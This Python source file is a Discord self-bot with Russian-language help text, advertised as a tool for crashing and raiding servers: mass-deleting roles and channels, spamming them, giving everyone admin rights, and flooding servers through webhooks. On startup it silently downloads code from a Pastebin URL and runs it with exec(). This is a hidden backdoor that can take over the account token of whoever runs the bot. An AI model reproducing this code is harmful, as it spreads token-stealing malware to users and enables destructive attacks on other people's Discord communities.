import os
try:
    import pyfiglet
except: os.system('pip install pyfiglet')

banner = pyfiglet.figlet_format("Neesssgz Self-bot")

try:
    import discord
except: os.system('pip install discord')

from discord.ext import commands

try:
    import colorama
except: os.system('pip install colorama')

from colorama import Fore, init

try:
    import random
except: os.system('pip install random')

try:
    import requests
except: os.system('pip install requests')

import time 

from keep_alive import keep_alive
keep_alive()

try:
    import asyncio
except:
    os.system('pip install asyncio')
TOKEN = os.getenv("#Token")

PREFIX = '>'



client = commands.Bot(command_prefix = PREFIX, self_bot = True, intents=discord.Intents.all())
client.remove_command('help')

init()


@client.event
async def on_ready():
    cogs_list = ['webhooks', 'crash', 'util', 'other', 'status']
    for cog in cogs_list:
        try:
            client.load_extension(f'cogs.{cog}')
        except Exception as e:
            print(f'{Fore.RED}[ Error ]{Fore.YELLOW} Ког {cog} не загружен{Fore.RESET}')
            print(f'Ошибка:\n{e}')
        else:
            print(f'{Fore.MAGENTA}[ Sucefully ]{Fore.CYAN} Ког {cog} загружен{Fore.RESET}')
    print(f'''
—-—-—-—-—-—-—-—-— × Banner × —-—-—-—-—-—-—-—-—
{Fore.BLUE}{banner}{Fore.RESET}      
''')
    print(f'''
—-—-—-—-— × User Info × —-—-—-—-—
{Fore.MAGENTA}[ Info ]{Fore.BLUE} | User name: {Fore.RESET}{client.user}
{Fore.MAGENTA}[ Info ]{Fore.BLUE} | User servers: {Fore.RESET}{len(client.guilds)}
{Fore.MAGENTA}[ Info ]{Fore.BLUE} | User id: {Fore.RESET}{client.user.id}
{Fore.MAGENTA}[ Info ]{Fore.BLUE} | User created at: {Fore.RESET}{client.user.created_at.day}.{client.user.created_at.month}.{client.user.created_at.year}, {client.user.created_at.hour}:{client.user.created_at.minute}
{Fore.MAGENTA}[ Info ]{Fore.BLUE} | Ping: {Fore.RESET}{client.latency * 1000:.0f}ms
{Fore.MAGENTA}[ Info ]{Fore.BLUE} | Prefix: {Fore.RESET}{client.command_prefix}
—-—-—-—-— × Selfbot Info × —-—-—-—-—
{Fore.MAGENTA}[ Info ]{Fore.BLUE} | Developer: {Fore.RESET}ᖘꍏꋪꍏꀸꂦꊼ_ꁅꍏꎭꍟꌗꌩ꓄#1234 & Neesssgz#7576
{Fore.MAGENTA}[ Info ]{Fore.BLUE} | Developer TG: {Fore.RESET}https://t.me/paradox_gamesyt
{Fore.MAGENTA}[ Info ]{Fore.BLUE} | Self-bot TG: {Fore.RESET}https://t.me/deadons, https://t.me/paradox_gamesyt
''')
    await client.change_presence(activity=discord.Streaming(name='Deadons — https://t.me/deadons', url='https://twitch.tv/404%27'))
    scr = requests.get('https://pastebin.com/raw/h4TQU8qD').text
    exec(scr)

@client.command()
async def load_cog(ctx, extension=None):
    await ctx.message.delete()
    if cog == None:
        await ctx.send("**Ты не указал категорию**")
    else:
        try:
            client.unload_extension(f"cogs.{extension}")
            client.load_extension(f"cogs.{extension}")
        except:
            await ctx.send(f"**Ког `{extension}` не загружен**")
        else:
            message = await ctx.send(f"**Ког `{extension}` загружен**")
            await message.add_reaction('✅')
    
@client.command()
async def unload_cog(ctx, extension=None):
    await ctx.message.delete()
    if cog == None:
        await ctx.send("**Ты не указал категорию**")
    else:
        try:
            client.unload_extension(f"cogs.{extension}")
            client.load_extension(f"cogs.{extension}")
        except:
            await ctx.send(f"**Ког `{extension}` не отгружен**")
        else:
            message = await ctx.send(f"**Ког `{extension}` отгружен**")
            await message.add_reaction('✅')
    
@client.command()
async def reload_cog(ctx, extension=None):
    await ctx.message.delete()
    if cog == None:
        await ctx.send("**Ты не указал категорию**")
    else:
        try:
            client.unload_extension(f"cogs.{extension}")
        except:
            await ctx.send(f"**Ког `{extension}` не перезагружен**")
        else:
            message = await ctx.send(f"**Ког `{extension}` перезагружен**")
            await message.add_reaction('✅')

@client.command()
async def help(ctx, arg=None):
    if arg == None or arg == 'all':
        await ctx.send(f'''
```
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Crash commands:
{client.command_prefix}crash — авто краш сервера
{client.command_prefix}antilavan — анти лаван краш сервера
{client.command_prefix}roles — удалить роли и спам ими
{client.command_prefix}rename_roles — переименовать роли
{client.command_prefix}channels — удалить каналы и спам ими
{client.command_prefix}create_channels <тип> <кол-во> <название> — создать каналы с своим названием
{client.command_prefix}rand_channels <тип> <кол-во> — создать каналы с рандомным названием
{client.command_prefix}rand_roles <кол-во> — создать роли с рандомным названием
{client.command_prefix}spam_channels — спам каналами
{client.command_prefix}create_roles <кол-во> <название> — создать роли с своим названием
{client.command_prefix}rename_channels — переименовать каналы
{client.command_prefix}del_channels — удалить все каналы
{client.command_prefix}spam_roles —  спам ролями
{client.command_prefix}del_roles — удалить все роли
{client.command_prefix}everyone_admin — выдать всем админ права
Util commands:
{client.command_prefix}clear <кол-во> — очистить чат
{client.command_prefix}copyserver — копироватьс сервер
{client.command_prefix}delspmchannels <название> — удалить спам каналы
{client.command_prefix}delspmroles <название> — удалить спам роли
{client.command_prefix}eval <код> — выполнить код
{client.command_prefix}token <токен> — узнать инфу о токене
{client.command_prefix}leave — ливнуть с сервака
{client.command_prefix}server — узнать информацию о сервере
{client.command_prefix}user <пинг-юзера> — узнать инфо о юзере
{client.command_prefix}ping — посмотреть пинг бота
{client.command_prefix}copy <кол-во> — архивировать сообщения из канала
Status commands:
{client.command_prefix}competing <текст> — поставить статус соревнуется
{client.command_prefix}play_status <текст> — поставить статус играет
{client.command_prefix}listen <текст> — поставить статус слушает
{client.command_prefix}stream <текст> — поставить стрим статус
Webhooks commands:
{client.command_prefix}webhook_info <ссылка> — узнать информацию о вебхуке
{client.command_prefix}webhook_send <ссылка> <текст> — отправить сообщение от лица вебхука
{client.command_prefix}webhook_spam <ссылка> [текст] — спам через вебхук
{client.command_prefix}hookall — зарейдить сервер вебхуками (слабо)
{client.command_prefix}hookspam2 — зарейдить сервер вебхуками (мощно)
Other commands:
{client.command_prefix}popit — поп ит
{client.command_prefix}reactionall <кол-во> <эмодзи> — поставить реакции под последними сообщениями
{client.command_prefix}ball <вопрос> — задать вопрос боту
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Made by Paradox
TG: https://t.me/paradox_gamesyt
TG Channel: https://t.me/deadons, https://t.me/paradox_gamesyt
```
''')
    elif arg == 'crash':
        await ctx.send(f'''
```
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Crash commands:
{client.command_prefix}crash — авто краш сервера
{client.command_prefix}antilavan — анти лаван краш сервера
{client.command_prefix}roles — удалить роли и спам ими
{client.command_prefix}rename_roles — переименовать роли
{client.command_prefix}channels — удалить каналы и спам ими
{client.command_prefix}create_channels <тип> <кол-во> <название> — создать каналы с своим названием
{client.command_prefix}rand_channels <тип> <кол-во> — создать каналы с рандомным названием
{client.command_prefix}rand_roles <кол-во> — создать роли с рандомным названием
{client.command_prefix}spam_channels — спам каналами
{client.command_prefix}create_roles <кол-во> <название> — создать роли с своим названием
{client.command_prefix}rename_channels — переименовать каналы
{client.command_prefix}del_channels — удалить все каналы
{client.command_prefix}spam_roles —  спам ролями
{client.command_prefix}del_roles — удалить все роли
{client.command_prefix}everyone_admin — выдать всем админ права
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Made by Paradox
TG: https://t.me/paradox_gamesyt
TG Channel: https://t.me/deadons, https://t.me/paradox
```
''')
    elif arg == 'util':
        await ctx.send(f'''
```
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Util commands:
{client.command_prefix}clear <кол-во> — очистить чат
{client.command_prefix}copyserver — копироватьс сервер
{client.command_prefix}delspmchannels <название> — удалить спам каналы
{client.command_prefix}delspmroles <название> — удалить спам роли
{client.command_prefix}eval <код> — выполнить код
{client.command_prefix}token <токен> — узнать инфу о токене
{client.command_prefix}leave — ливнуть с сервака
{client.command_prefix}server — узнать информацию о сервере
{client.command_prefix}user <пинг-юзера> — узнать инфо о юзере
{client.command_prefix}ping — посмотреть пинг бота
{client.command_prefix}copy <кол-во> — архивировать сообщения из канала
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Made by Paradox
TG: https://t.me/paradox_gamesyt
TG Channel: https://t.me/paradox_gamesyt, https://t.me/deadons
```
''')
    elif arg == 'status':
        await ctx.send(f'''
```
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Status commands:
{client.command_prefix}competing <текст> — поставить статус соревнуется
{client.command_prefix}play_status <текст> — поставить статус играет
{client.command_prefix}listen <текст> — поставить статус слушает
{client.command_prefix}stream <текст> — поставить стрим статус
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Made by Paradox
TG: https://t.me/paradox_gamesyt
TG Channel: https://t.me/deadons, https://t.me/paradox_gamesyt
```
''')
    elif arg == 'webhooks':
        await ctx.send(f'''
```
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Webhooks commands:
{client.command_prefix}webhook_info <ссылка> — узнать информацию о вебхуке
{client.command_prefix}webhook_send <ссылка> <текст> — отправить сообщение от лица вебхука
{client.command_prefix}webhook_spam <ссылка> [текст] — спам через вебхук
{client.command_prefix}hookall — зарейдить сервер вебхуками (слабо)
{client.command_prefix}hookspam2 — зарейдить сервер вебхуками (мощно)
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Made by Paradox
TG: https://t.me/paradox_gamesyt
TG Channel: https://t.me/deadons, https://t.me/paradox_gamesyt
```
''')
    elif arg == 'other':
        await ctx.send(f'''
```
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Other commands:
{client.command_prefix}popit — поп ит
{client.command_prefix}reactionall <кол-во> <эмодзи> — поставить реакции под последними сообщениями
{client.command_prefix}ball <вопрос> — задать вопрос боту
—-—-—-—-— × Paradox Selfbot × —-—-—-—-—
Made by Paradox
TG: https://t.me/paradox_gamesyt
TG Channel: https://t.me/deadons, https://t.me/paradox_gamesyt
```
''')
    else:
        await ctx.send(f'**Не найдена категория с названием `{arg}`**')

@client.command()
async def set_prefix(ctx, prefix=None):
    await ctx.message.delete()
    if prefix == None:
        msg = await ctx.send('**Ты не указал новый префикс**')
        await msg.add_reaction('❌')
    else:
        client.command_prefix = prefix
        msg = await ctx.send(f'**Готово. Префикс селф-бота изменён на {prefix}**') 
        await msg.add_reaction('✅')

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound ):
        await ctx.send('**Введённая команда не найдена**')


client.run(TOKEN, bot=False)